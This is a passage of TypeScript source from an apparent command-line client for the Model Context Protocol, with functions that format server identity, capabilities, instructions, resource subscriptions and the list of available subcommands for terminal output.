  negotiatedVersion?: string
): string {
  const lines: string[] = [];
  const bullet = chalk.dim('*');
  const serverInfo = result._meta?.[SERVER_INFO_META_KEY] as Implementation | undefined;

  if (serverInfo) {
    lines.push(...formatServerIdentity(serverInfo));
    lines.push('');
  }

  // Every version on offer, with the one this session negotiated marked — the reason to
  // run this command over reading the cached session info.
  const versions = result.supportedVersions.map((version) =>
    version === negotiatedVersion ? `${version} ${chalk.gray('(negotiated)')}` : version
  );
  lines.push(chalk.bold('Supported protocol versions:') + ` ${versions.join(', ')}`);
  lines.push('');

  lines.push(chalk.bold('Capabilities:'));
  const capabilityList = formatCapabilityList(result.capabilities, negotiatedVersion);
  lines.push(capabilityList.length > 0 ? capabilityList.join('\n') : `${bullet} (none)`);
  lines.push('');

  const instructions = result.instructions?.trim();
  if (instructions) {
    lines.push(chalk.bold('Instructions:'));
    lines.push(chalk.gray('````'));
    lines.push(instructions);
    lines.push(chalk.gray('````'));
    lines.push('');
  }

  // Extension metadata the server attached to its advertisement, beyond its identity
  const extraMeta = Object.entries(result._meta ?? {}).filter(
    ([key]) => key !== SERVER_INFO_META_KEY
  );
  if (extraMeta.length > 0) {
    lines.push(chalk.bold('Metadata:'));
    lines.push(formatObject(Object.fromEntries(extraMeta)));
    lines.push('');
  }

  // Plain footer rather than an indented "↳" hint: this block ends with the server's
  // instructions, which can run for pages, so an indented arrow reads as part of them.
  lines.push(
    chalk.dim(`For session info and available commands, run: ${commandHint(`mcpc ${target}`)}`)
  );

  return lines.join('\n');
}

/**
 * Format server details for human-readable output
 */
export function formatServerDetails(
  details: ServerDetails,
  target: string,
  tools?: Tool[],
  resourceSubscriptions?: ResourceSubscriptionEntry[],
  pinnedProtocolVersion?: string
): string {
  const lines: string[] = [];
  const bullet = chalk.dim('*');
  const bt = chalk.gray('`'); // backtick

  const { serverInfo, capabilities, instructions, protocolVersion, connectionMode, transport } =
    details;

  // One line for how mcpc is talking to the server: the negotiated protocol version
  // ("(pinned)" when --protocol-version fixed it), the transport, and whether that
  // transport carries server-side session state. The mode belongs to the transport, not
  // to the version: a 2025-11-25 HTTP server that issues no session id is stateless too,
  // while stdio is always stateful. Mirrored in `--json` as `_mcpc.transport`/`stateless`.
  // Comes first: the connection is what the rest of the screen is reported over.
  // The server's other supported versions stay a `--json`-only detail (supportedVersions).
  if (protocolVersion) {
    const pinned = pinnedProtocolVersion ? ` ${chalk.gray('(pinned)')}` : '';
    const mode = connectionMode && connectionMode !== 'unknown' ? ` (${connectionMode})` : '';
    const via = transport ? chalk.gray(' / ') + `${formatTransportKind(transport)}${mode}` : '';
    lines.push(chalk.bold('MCP:') + ` version ${protocolVersion}${pinned}${via}`);
    lines.push('');
  }

  // Server info
  if (serverInfo) {
    lines.push(...formatServerIdentity(serverInfo));
    lines.push('');
  }

  // Capabilities - only show what the server actually exposes, annotated for the era
  const isModern = !!protocolVersion && isModernProtocolVersion(protocolVersion);
  const skills = skillsExtensionSettings(capabilities);

  lines.push(chalk.bold('Capabilities:'));
  const capabilityList = formatCapabilityList(capabilities, protocolVersion);
  lines.push(capabilityList.length > 0 ? capabilityList.join('\n') : `${bullet} (none)`);
  lines.push('');

  // Instructions in code block
  const trimmed = instructions ? instructions.trim() : '';
  if (trimmed) {
    lines.push(chalk.bold('Instructions:'));
    lines.push(chalk.gray('````'));
    lines.push(trimmed);
    lines.push(chalk.gray('````'));
    lines.push('');
  }

  // Active resource→file syncs created with resources-subscribe
  if (resourceSubscriptions && resourceSubscriptions.length > 0) {
    lines.push(chalk.bold('Resource subscriptions:'));
    for (const sub of resourceSubscriptions) {
      const status = sub.lastError
        ? theme.red(`sync failing: ${sub.lastError}`)
        : sub.lastSyncedAt
          ? chalk.dim(`synced ${formatTimeAgo(sub.lastSyncedAt)}`)
          : chalk.dim('not synced yet');
      lines.push(`${bullet} ${inBackticks(sub.uri)} → ${sub.filePath} (${status})`);
    }
    lines.push('');
  }

  // Tools list (from bridge cache, no extra server call)
  if (tools && tools.length > 0) {
    lines.push(formatToolsCompact(tools, { sessionName: target }));
    lines.push('');
  }

  // Commands
  const commands: string[] = [];

  if (capabilities?.tools) {
    commands.push(`${bullet} ${bt}${commandExample(`mcpc ${target} tools-list [--full]`)}${bt}`);
    commands.push(`${bullet} ${bt}${commandExample(`mcpc ${target} tools-get <name>`)}${bt}`);
    commands.push(
      `${bullet} ${bt}${commandExample(`mcpc ${target} tools-call <name> [arg1:=val1 ... | <args-json> | <stdin]`)}${bt}`
    );
  }

  if (capabilities?.resources) {
    commands.push(`${bullet} ${bt}${commandExample(`mcpc ${target} resources-list`)}${bt}`);
    commands.push(
      `${bullet} ${bt}${commandExample(`mcpc ${target} resources-read <uri> [-o <file>]`)}${bt}`
    );
    if (capabilities.resources.subscribe) {
      commands.push(
        `${bullet} ${bt}${commandExample(`mcpc ${target} resources-subscribe <uri> <file>`)}${bt}`
      );
    }
  }

  // Skills commands need the server's declaration and a connection that can carry the
  // extension; directory reads need the optional setting on top of that.
  if (skills && isModern) {
    commands.push(`${bullet} ${bt}${commandExample(`mcpc ${target} skills-list`)}${bt}`);
    commands.push(
      `${bullet} ${bt}${commandExample(`mcpc ${target} skills-get <name> [file] [--raw]`)}${bt}`
    );
    if (skills.directoryRead === true) {
      commands.push(
        `${bullet} ${bt}${commandExample(`mcpc ${target} resources-directory-read <uri>`)}${bt}`
      );
    }
  }

  if (capabilities?.prompts) {
    commands.push(`${bullet} ${bt}${commandExample(`mcpc ${target} prompts-list`)}${bt}`);
    commands.push(
      `${bullet} ${bt}${commandExample(`mcpc ${target} prompts-get <name> [arg1:=val1 ... | <args-json> | <stdin]`)}${bt}`
    );
  }

  // Completions work the same in every era; only the server's declaration gates them
  if (capabilities?.completions) {
    commands.push(
      `${bullet} ${bt}${commandExample(`mcpc ${target} completion-complete prompt|resource <ref> <arg1:=val1 ... | <args-json> | <stdin>`)}${bt}`
    );
  }

  // Task commands need what the era calls task support: the 2025 `tasks` capability, or
  // the 2026-07-28 tasks extension. Logging commands are 2025-era only.
  const tasksExtension = declaredExtensionSettings(capabilities, TASKS_EXTENSION_KEY);
  if ((capabilities?.tasks && !isModern) || (tasksExtension && isModern)) {
    commands.push(`${bullet} ${bt}${commandExample(`mcpc ${target} tasks-list`)}${bt}`);
    commands.push(`${bullet} ${bt}${commandExample(`mcpc ${target} tasks-get <taskId>`)}${bt}`);
    commands.push(`${bullet} ${bt}${commandExample(`mcpc ${target} tasks-result <taskId>`)}${bt}`);
    commands.push(`${bullet} ${bt}${commandExample(`mcpc ${target} tasks-cancel <taskId>`)}${bt}`);
  }

  if (capabilities?.logging && !isModern) {
    commands.push(
      `${bullet} ${bt}${commandExample(`mcpc ${target} logging-set-level <lvl>`)}${bt}`
    );
  }

  if (target.startsWith('@')) {
    commands.push(`${bullet} ${bt}${commandExample(`mcpc ${target} logs`)}${bt}`);
  }

  if (commands.length > 0) {
    lines.push(chalk.bold('Available commands:'));
    lines.push(commands.join('\n'));
    lines.push('');
  }

  // Debugging hint: how to view logs (only shown for sessions, i.e. @name targets)
  if (target.startsWith('@')) {
    lines.push(chalk.dim(`For session logs, run: ${commandHint(`mcpc ${target} logs`)}`));
    lines.push(chalk.dim(`Log file: ${getBridgeLogPath(target)}`));
    lines.push('');
  }

  return lines.join('\n');
}

/**
 * Format a JSON output help line with backtick-style Markdown formatting.
 * Optional schemaUrl adds a "Schema:" link for AI agents — pass several (e.g. one per
 * protocol era) to get one per line, each aligned under the first.
 */
export function jsonHelp(
  description: string,
  shape?: string,
  schemaUrl?: string | string[]
): string {
  const line = shape ? `  ${description}:\n  ${shape}` : `  ${description}`;
  const urls = schemaUrl === undefined ? [] : [schemaUrl].flat();
  const schemaIndent = '\n' + ' '.repeat('  Schema: '.length);
  const link = urls.length > 0 ? `\n  Schema: ${urls.join(schemaIndent)}` : '';
  return `\n${chalk.bold('JSON output (--json):')}\n${line}${link}\n`;
}
